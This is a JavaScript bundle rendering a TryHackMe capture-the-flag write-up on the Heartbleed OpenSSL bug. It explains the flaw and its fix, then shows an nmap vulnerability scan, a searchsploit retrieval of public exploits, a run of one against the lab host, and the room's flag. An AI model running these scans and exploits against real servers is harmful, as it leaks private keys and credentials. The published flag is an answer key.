"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[5359],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},s=Object.keys(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},h="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,s=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),h=c(n),d=r,m=h["".concat(l,".").concat(d)]||h[d]||u[d]||s;return n?a.createElement(m,o(o({ref:t},p),{},{components:n})):a.createElement(m,o({ref:t},p))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var s=n.length,o=new Array(s);o[0]=d;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[h]="string"==typeof e?e:r,o[1]=i;for(var c=2;c<s;c++)o[c]=n[c];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},61689:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>u,frontMatter:()=>s,metadata:()=>i,toc:()=>c});var a=n(87462),r=(n(67294),n(3905));const s={},o="HeartBleed",i={unversionedId:"Tryhackme/HeartBleed/Heartbleed",id:"Tryhackme/HeartBleed/Heartbleed",title:"HeartBleed",description:"SSL issues are still lurking in the wild. Can you exploit this web servers OpenSSL?",source:"@site/writeups/Tryhackme/HeartBleed/Heartbleed.md",sourceDirName:"Tryhackme/HeartBleed",slug:"/Tryhackme/HeartBleed/",permalink:"/writeups/Tryhackme/HeartBleed/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"hc0n Christmas CTF",permalink:"/writeups/Tryhackme/Hc0n Christmas CTF/hcon christmas ctf"},next:{title:"History of Malware",permalink:"/writeups/Tryhackme/History of Malware/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Background Information",id:"task-1-background-information",level:2},{value:"Task 2 Protecting Data In Transit",id:"task-2-protecting-data-in-transit",level:2}],p={toc:c},h="wrapper";function u(e){let{components:t,...n}=e;return(0,r.kt)(h,(0,a.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"heartbleed"},"HeartBleed"),(0,r.kt)("p",null,"SSL issues are still lurking in the wild. Can you exploit this web servers OpenSSL?"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/heartbleed"},"HeartBleed")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"HeartBleed"),(0,r.kt)("li",{parentName:"ul"},"CVE-2014-0346 OpenSSL 1.0.1 - 1.0.1f"),(0,r.kt)("li",{parentName:"ul"},"CVE-2014-0160 OpenSSL 1.0.1 - 1.0.1f")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-background-information"},"Task 1 Background Information"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Introduction to Heartbleed and SSL/TLS")),(0,r.kt)("p",null,"On the internet today, most web servers are configured to use SSL/TLS. SSL(secure socket layer) is just a predecessor to ",(0,r.kt)("a",{parentName:"p",href:"https://medium.com/sitewards/the-magic-of-tls-x509-and-mutual-authentication-explained-b2162dec4401"},"TLS"),"(transport layer security). The most common versions are TLS 1.2 and TLS 1.3(which has recently been released). Configuring a web server to use TLS means that all communication from that particular server to a client will be encrypted; any malicious third party that has access to this traffic will not be able to understand/decrypt the traffic, and they also will not be able to modify the traffic. To learn more about how the TLS connections are established, check ",(0,r.kt)("a",{parentName:"p",href:"https://tls.ulfheim.net/"},"1.2")," and ",(0,r.kt)("a",{parentName:"p",href:"https://tls13.ulfheim.net/"},"1.3")," out.\nHeartbleed is a bug due to the implementation in the OpenSSL library from versions 1.0.1 to 1.0.1f(which is very widely used). It allows a user to access memory on the server(which they usually wouldn't have access to). This in turn allows a malicious user to access different kinds of information(that they wouldn't usually have access to due to the encryption and integrity provided by TLS) including:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"server private key"),(0,r.kt)("li",{parentName:"ul"},"confidential data like usernames, passwords and other personal information")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Analysing the Bug")),(0,r.kt)("p",null,"The implementation error occurs in the heartbeat message that is used by OpenSSL to keep a connection alive even when no data is sent. A mechanism like this is important because if a connection dies/resets quite often, it would be expensive to set up the TLS aspect of the connection again; this affects the latency across the internet and it would make using services slow for users. A heartbeat message sent by one end of the connection contains random data and the length of the data, and this exact data is sent back when received by the other end of the connection. When the server retrieves this message from the client here's what it does:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"The server constructs a pointer(memory location) to the heartbeat record"),(0,r.kt)("li",{parentName:"ul"},"It then copies the length of the data sent by a user into a variable(called payload)",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"The length of this data is unchecked"))),(0,r.kt)("li",{parentName:"ul"},"The server then allocates memory in the form of:",(0,r.kt)("ul",{parentName:"li"},(0,r.kt)("li",{parentName:"ul"},"1 + 2 + payload + padding(this can be maximum of 1 + 2 + 65535 + 16)"))),(0,r.kt)("li",{parentName:"ul"},"The server then creates another pointer(bp) to access this memory"),(0,r.kt)("li",{parentName:"ul"},"The server then copies payload number of bytes from data sent by the user to the bp pointer"),(0,r.kt)("li",{parentName:"ul"},"The server sends the data contained in the bp pointers to the user")),(0,r.kt)("p",null,"With this, you can see that the user controls the amount and length of data they send over. If the user does not send over any data(where the length is 0), it means that the server will copy arbitrary memory into the new pointer(which is how it can access secret information on the server). When retrieving data this way, the data can be different with different responses as the memory on the server will change."),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Remediation")),(0,r.kt)("p",null,"To ensure that arbitrary data from the server isn\u2019t copied and sent to a user, the server needs to check the length of the heartbeat message:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"The server needs to check that the length of the heartbeat message sent by the user isn\u2019t 0"),(0,r.kt)("li",{parentName:"ul"},"The server needs to check the the length doesn\u2019t exceed the specified length of the variable that holds the data")),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"References:")),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"http://heartbleed.com/"},"http://heartbleed.com/")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html"},"https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://stackabuse.com/heartbleed-bug-explained/"},"https://stackabuse.com/heartbleed-bug-explained/"))),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Read above and ensure you have a good understanding of how the Heartbleed vulnerability works.")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("h2",{id:"task-2-protecting-data-in-transit"},"Task 2 Protecting Data In Transit"),(0,r.kt)("p",null,"In this task, you need to obtain a flag using a very well known vulnerability. Make sure you pay attention to all the information and errors displayed. Pay particular attention to how web servers are configured."),(0,r.kt)("p",null,"It may take between 3-4 minutes for the server to deploy and configure. Please be patient."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HeartBleed$ sudo nmap -sS -sC -sV -O --script vuln 34.255.196.87\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 19:23 CEST\nPre-scan script results:\n| broadcast-avahi-dos:\n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nNmap scan report for ec2-34-255-196-87.eu-west-1.compute.amazonaws.com (34.255.196.87)\nHost is up (0.043s latency).\nNot shown: 994 closed ports\nPORT    STATE    SERVICE      VERSION\n22/tcp  open     ssh          OpenSSH 7.4 (protocol 2.0)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n| vulners:\n|   cpe:/a:openbsd:openssh:7.4:\n|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111\n|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919\n|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473\n|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906\n|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905\n|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110\n|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109\n|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685\n111/tcp open     rpcbind      2-4 (RPC #100000)\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          33647/tcp6  status\n|   100024  1          42833/tcp   status\n|   100024  1          52119/udp6  status\n|_  100024  1          52143/udp   status\n135/tcp filtered msrpc\n139/tcp filtered netbios-ssn\n443/tcp open     ssl/http     nginx 1.15.7\n|_clamav-exec: ERROR: Script execution failed (use -d to debug)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n|_http-server-header: nginx/1.15.7\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| http-vuln-cve2011-3192:\n|   VULNERABLE:\n|   Apache byterange filter DoS\n|     State: VULNERABLE\n|     IDs:  BID:49303  CVE:CVE-2011-3192\n|       The Apache web server is vulnerable to a denial of service attack when numerous\n|       overlapping byte ranges are requested.\n|     Disclosure date: 2011-08-19\n|     References:\n|       https://www.securityfocus.com/bid/49303\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192\n|       https://seclists.org/fulldisclosure/2011/Aug/175\n|_      https://www.tenable.com/plugins/nessus/55976\n| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the \"CCS Injection\" vulnerability.\n|\n|     References:\n|       http://www.cvedetails.com/cve/2014-0224\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|_      http://www.openssl.org/news/secadv_20140605.txt\n| ssl-heartbleed:\n|   VULNERABLE:\n|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.\n|\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160\n|       http://cvedetails.com/cve/2014-0160/\n|_      http://www.openssl.org/news/secadv_20140407.txt\n|_sslv2-drown:\n445/tcp filtered microsoft-ds\nAggressive OS guesses: Linux 3.1 (87%), Linux 3.2 (87%), Linux 3.10 - 3.13 (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Roku 2 XS media player (Linux 2.6.32) (86%), Linux 2.6.32 (86%), Linux 3.1 - 3.2 (86%), Linux 3.11 (86%), Linux 3.2 - 4.9 (86%), Linux 3.5 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 21 hops\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 298.02 seconds\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/HeartBleed$ searchsploit heartbleed\n------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                         |  Path\n------------------------------------------------------------------------------------------------------- ---------------------------------\nOpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)    | multiple/remote/32764.py\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                    | multiple/remote/32791.c\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                     | multiple/remote/32998.c\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                       | multiple/remote/32745.py\n------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\nkali@kali:~/CTFs/tryhackme/HeartBleed$ searchsploit -m 32764 32791 32998 32745\n  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)\n      URL: https://www.exploit-db.com/exploits/32764\n     Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py\nFile Type: Python script, ASCII text executable, with CRLF line terminators\n\nCopied to: /home/kali/CTFs/tryhackme/HeartBleed/32764.py\n\n\n  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)\n      URL: https://www.exploit-db.com/exploits/32791\n     Path: /usr/share/exploitdb/exploits/multiple/remote/32791.c\nFile Type: C source, ASCII text, with CRLF line terminators\n\nCopied to: /home/kali/CTFs/tryhackme/HeartBleed/32791.c\n\n\n  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)\n      URL: https://www.exploit-db.com/exploits/32998\n     Path: /usr/share/exploitdb/exploits/multiple/remote/32998.c\nFile Type: ASCII text, with CRLF line terminators\n\nCopied to: /home/kali/CTFs/tryhackme/HeartBleed/32998.c\n\n\n  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure\n      URL: https://www.exploit-db.com/exploits/32745\n     Path: /usr/share/exploitdb/exploits/multiple/remote/32745.py\nFile Type: Python script, ASCII text executable, with CRLF line terminators\n\nCopied to: /home/kali/CTFs/tryhackme/HeartBleed/32745.py\n\n\nkali@kali:~/CTFs/tryhackme/HeartBleed$ python 32745.py 34.240.13.68 > 32745result.txt\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"What is the flag?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{sSl-Is-BaD}")))}u.isMDXComponent=!0}}]);